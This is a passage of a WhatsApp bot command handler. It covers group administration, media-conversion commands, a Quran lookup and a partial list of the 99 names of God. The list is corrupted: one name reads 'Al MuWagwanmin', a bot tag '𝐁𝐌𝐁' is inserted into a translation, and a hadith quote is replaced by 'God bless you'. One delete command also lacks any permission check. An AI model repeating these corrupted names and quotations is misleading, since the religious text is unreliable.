var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replydare('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replydare(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Dare.groupSettingUpdate(from, 'announcement')
replydare(close)
}, timer)
}
break
           case 'ephemeral':
case 'disappear': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins) return reply('Admin only!!')
if (!text) return replydare('Enter the value enable/disable')
if (args[0] === 'enable') {
await Dare.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await Dare.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replydare(`Done`)
}
            }
            break
            case 'delete': case 'del': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!m.quoted) throw false
let { chat, id } = m.quoted
 Dare.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 Dare.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
let response = await Dare.groupInviteCode(m.chat)
Dare.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replydare('The message was not sent by a bot!')
                 Dare.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replydare('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replydare(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Dare.groupSettingUpdate(from, 'not_announcement')
replydare(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dare.groupParticipantsUpdate(m.chat, [users], 'remove')
await replydare(`Done`)
}
break
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
const users = participants.map(a => a.id)
await Dare.groupParticipantsUpdate(m.chat, [users], 'remove')
await replydare(`Done`)
}
break
case 'setbotname':{
if (!DareTheCreator) return reply(mess.only.owner)
if (!text) return replydare(`Where's the name?\Example: ${prefix + command} 𝐁𝐌𝐁 `)
    await Dare.updateProfileName(text)
    replydare(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!DareTheCreator) return reply(mess.only.owner)
if (!text) return replydare(`Wheres the name?\nExample: ${prefix + command} 𝐁𝐌𝐁 `)
    await Dare.updateProfileStatus(text)
    replydare(`Success in changing the bio of bot's number`)
    }
    break
   case 'setnamegc': case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins) return reply('Admin only!!')
if (!text) return replydare('Text ?')
await Dare.groupUpdateSubject(m.chat, text)
await replydare(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins) return reply('Admin only!!')
if (!text) return replydare('Text ?')
await Dare.groupUpdateDescription(m.chat, text)
await replydare(`Done`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Used specifically in groups")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await Dare.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
Dare.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!quoted) return replydare(`Where is the picture?`)
if (!/image/.test(mime)) return replydare(`Send/Reply to Images With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replydare(`Send/Reply to Images With Caption ${prefix + command}`)
var mediz = await Dare.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Dare.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replydare(`Success`)
} else {
var memeg = await Dare.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replydare(`Success`)
}
}
break
case 'deleteppgroup': case 'delgcpp': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
    await Dare.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!DareTheCreator) return reply(mess.only.owner)
    await Dare.removeProfilePicture(Dare.user.id)
    replydare(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dare.groupParticipantsUpdate(m.chat, [users], 'promote')
await replydare(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dare.groupParticipantsUpdate(m.chat, [users], 'demote')
await replydare(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
Dare.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'ht': {
if (!m.isGroup) return reply(mess.only.group)
if (!DareTheCreator) return reply(mess.only.owner)
Dare.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break

case 'totag':
case 'tag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
               if (!m.quoted) return replydare(`Reply message with caption ${prefix + command}`)
               Dare.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
Dare.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replydare(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replydare(eb)
}
break
case 'dbinary': {
if (!q) return replydare(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replydare(db)
}
break
case 'toanime': case 'jadianime': {
if (!isPrem) return reply(mess.only.premium)
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await Dare.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
const imganime = await fetchJson(`https://itzpire.com/tools/jadianime?url=${anuu}`)
Dare.sendMessage(m.chat, { image: { url: imganime.result }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}
break
//=========================================\\
case 'removebg': case 'nobg': case 'hapusbackground': {
if (!quoted) return replydare(`where's the photo bro?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await Dare.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
const getimg = await fetchJson(`https://itzpire.com/ai/remove-bg?url=${anuu}`)
Dare.sendMessage(m.chat, { image: { url: getimg.result }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('Yes, please report the error to the owner so it can be fixed')
	}
}
break
//=========================================\\
case 'hd':
  case 'remini':{
if (!quoted) return replydare(`Dimana gambarnya?`)
			if (!/image/.test(mime)) return replydare(`Send/Reply to Photos with captions ${prefix + command}`)
			reply(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Dare.sendMessage(m.chat, { image: proses, caption: `_Successful creation ${command}_`}, { quoted: m})
			} catch {
			  reply('yah eror kak')
			}
			}
			break
//=========================================\\
case 'ss':
case 'ssweb': {
				if (!text) return replydare(`Example: ${prefix + command} https://github.com/salmanytofficial`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await Dare.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await Dare.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
//======================================================================
case 'nulis':
case 'nulisbuku': {
  if (!isPrem) return replyprem(mess.premium)
  const { format } = require('util')
const { spawn } = require('child_process')
    let fontPath = 'src/Zahraaa.ttf'
    let inputPath = 'src/kertas.jpg'
    let d = new Date()
    let tgl = d.toLocaleDateString('id-Id')
    let hari = d.toLocaleDateString('id-Id', { weekday: 'long' })
    if (!args[0])  return reply('what do you want to write?')
    let teks = args.join` `
    let bufs = []
    const [_spawnprocess, ..._spawnargs] = [...(global.ownername? ['gm'] : global.ownername ? ['magick'] : []),
        'convert',
        inputPath,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '20',
        '-interline-spacing',
        '1',
        '-annotate',
        '+806+78',
        hari,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '18',
        '-interline-spacing',
        '1',
        '-annotate',
        '+806+102',
        tgl,
        '-font',
        fontPath,
        '-size',
        '1024x784',
        '-pointsize',
        '20',
        '-interline-spacing',
        '-7.5',
        '-annotate',
        '+344+142',
        teks,
        'jpg:-'
    ]
    spawn(_spawnprocess, _spawnargs)
        .on('error', e => m.reply(format(e)))
        .on('close', () => {
            Dare.sendFile(m.chat, Buffer.concat(bufs), 'nulis.jpg', 'Im done writing it', m)
        })
        .stdout.on('data', chunk => bufs.push(chunk))
}
break
case 'ttslide': case 'tiktokslide':{
if (!text) return replydare(`Use it by the way ${prefix+command} *url*\n\n_Examples_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
Dare.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://widipe.com/download/tiktokslide?url=${text}`)
await Dare.sendMessage(m.chat, { image: { url: anu.result.images}, caption: anu.result.title}, {quoted: m})
await Dare.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Dare.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
//=========================================\\
case 'quran': {
      try {
      // Extract the surah number or name from the command text.
      let surahInput = m.text.split(' ')[1]
      if (!surahInput) {
        throw new Error(`Please specify the surah number or name`)
      }
      let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
      let surahList = await surahListRes.json()
      let surahData = surahList.data.find(surah => 
          surah.number === Number(surahInput) || 
          surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
          surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
      )
      if (!surahData) {
        throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
      }
      let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
      if (!res.ok) {
        let error = await res.json();
        throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
      }
  
      let json = await res.json()
  
      // Translate tafsir from Bahasa Indonesia to Urdu
      let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })
  
      // Translate tafsir from Bahasa Indonesia to English
      let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })
  
      let quranSurah = `
  🕌 *Quran: The Holy Book*\n
  📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
  Type: ${json.data.type.en}\n
  Number of verses: ${json.data.ayahCount}\n
  🔮 *Explanation (Urdu):*\n
  ${translatedTafsirUrdu.text}\n
  🔮 *Explanation (English):*\n
  ${translatedTafsirEnglish.text}`
  
      replydare(quranSurah)
  
      if (json.data.recitation.full) {
        Dare.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
      }
    } catch (error) {
      replydare(`Error: ${error.message}`)
    }
    }
    break
case 'kisahnabi': {
     if (!text) return replydare(`Enter the name of the prophet\nExample: story of the prophet Adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replydare("*Not Found*\n*📮 ᴛɪᴘs :* try not to use capital letters")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Date of birth :*_ ${kisah.thn_kelahiran}
_*📍 Place of birth :*_ ${kisah.tmp}
_*📊 Age :*_ ${kisah.usia}

*— — — — — — — [ STORY ] — — — — — — —*

${kisah.description}`

     replydare(`${hasil}`)

}
break
//=========================================\\
const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
From Abu Hurarirah Radhiallahu Anhu, the Messenger of God said: "God bless you "
Meaning: "Indeed Allah has ninety-nine names, aka one hundred minus one. Whoever counts them, will surely enter heaven; He is witr and loves the witr".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Who Has Absolute Gracious Nature",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Who Has Absolute Loving Nature",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Who Has Absolute Domineering/Commanding Nature",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al MuWagwanmin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, 𝐁𝐌𝐁, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
